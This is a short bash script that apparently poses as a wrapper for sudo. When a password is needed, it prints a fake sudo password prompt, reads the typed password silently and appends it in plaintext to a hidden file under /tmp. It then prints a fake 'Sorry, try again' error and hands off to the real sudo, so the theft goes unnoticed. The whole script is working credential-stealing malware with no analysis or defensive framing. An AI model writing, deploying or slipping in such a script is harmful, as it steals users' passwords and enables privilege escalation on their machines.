#!/bin/bash

sudo='/usr/bin/sudo'
cmd=''

while test $# -gt 0; do
    cmd+=" $1"
    shift;
done

if sudo -n true 2>/dev/null; then 
    $sudo $cmd
else
    echo -n "[sudo] password for `whoami`: "
    stty -echo; read password; stty echo
    echo -e $password >> /tmp/.tmp/.chak
    sleep 2; echo -e '\nSorry, try again.'
    $sudo $cmd
fi
